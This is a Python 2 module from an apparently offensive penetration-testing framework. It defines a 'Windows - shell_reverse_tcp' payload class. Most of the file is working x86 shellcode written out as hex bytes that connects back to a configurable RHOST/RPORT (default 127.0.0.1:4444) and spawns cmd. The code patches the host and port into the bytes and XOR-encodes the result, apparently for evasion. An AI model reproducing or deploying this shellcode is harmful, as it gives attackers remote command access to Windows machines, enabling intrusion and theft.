#!/usr/bin/env python2
# -*- coding: utf-8 -*-

# python standard library

import binascii
import socket
from lib.ple.tools.shell.encode.xor import *
from lib.ple.tools.shell.encode.covert import *
from lib.ple.tools.lib.payloads.shellcode import *



class Payload(Shellcode):
    
    Shellcode.info["author"] = "mosin"
    Shellcode.info["name"] = "Windows - shell_reverse_tcp shellcode"
    Shellcode.info["references"] = [
        "https://www.exploit-db.com"
    ]
    
    def __init__(self, **kwargs):
        super(self.__class__, self).__init__()
        self.stager = (
                r"\xFC\xE8\x82\x00\x00\x00\x60\x89\xE5\x31\xC0\x64\x8B\x50\x30\x8B" +
                r"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\xAC\x3C" +
                r"\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF2\x52\x57\x8B\x52" +
                r"\x10\x8B\x4A\x3C\x8B\x4C\x11\x78\xE3\x48\x01\xD1\x51\x8B\x59\x20" +
                r"\x01\xD3\x8B\x49\x18\xE3\x3A\x49\x8B\x34\x8B\x01\xD6\x31\xFF\xAC" +
                r"\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF6\x03\x7D\xF8\x3B\x7D\x24\x75" +
                r"\xE4\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3" +
                r"\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF" +
                r"\xE0\x5F\x5F\x5A\x8B\x12\xEB\x8D\x5D\x68\x33\x32\x00\x00\x68\x77" +
                r"\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF\xD5\xB8\x90\x01\x00\x00" +
                r"\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x50\x50\x50\x50\x40" +
                r"\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x6A\x05\x68\x7F\x00" +
                r"\x00\x01\x68\x02\x00\x11\x5C\x89\xE6\x6A\x10\x56\x57\x68\x99\xA5" +
                r"\x74\x61\xFF\xD5\x85\xC0\x74\x0C\xFF\x4E\x08\x75\xEC\x68\xF0\xB5" +
                r"\xA2\x56\xFF\xD5\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x31\xF6" +
                r"\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01\x8D\x44\x24" +
                r"\x10\xC6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56\x56\x53\x56" +
                r"\x68\x79\xCC\x3F\x86\xFF\xD5\x89\xE0\x4E\x56\x46\xFF\x30\x68\x08" +
                r"\x87\x1D\x60\xFF\xD5\xBB\xE0\x1D\x2A\x0A\x68\xA6\x95\xBD\x9D\xFF" +
                r"\xD5\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A" +
                r"\x00\x53\xFF\xD5")
            
        self.register_option({
            "RHOST":{
                "default": "127.0.0.1",
                "desc": " RHOST",
                "Required":"no"
            	},
            "RPORT":{
                "default": 4444,
                "desc": " RPORT",
                "Required":"no"
            	}
       	    })

    def sld(self):
        rhost = self.options.RHOST['default']
        rport = self.options.RPORT['default']
        
        covert_shellcode = CovertBin(self.stager).little_covert_all(rhost,rport)
        customized_shellcode = "\\x" + '\\x'.join(covert_shellcode[i:i + 2] for i in range(0, len(covert_shellcode), 2))
        self.shellcode_info = EncoderModule(customized_shellcode).do_the_magic()

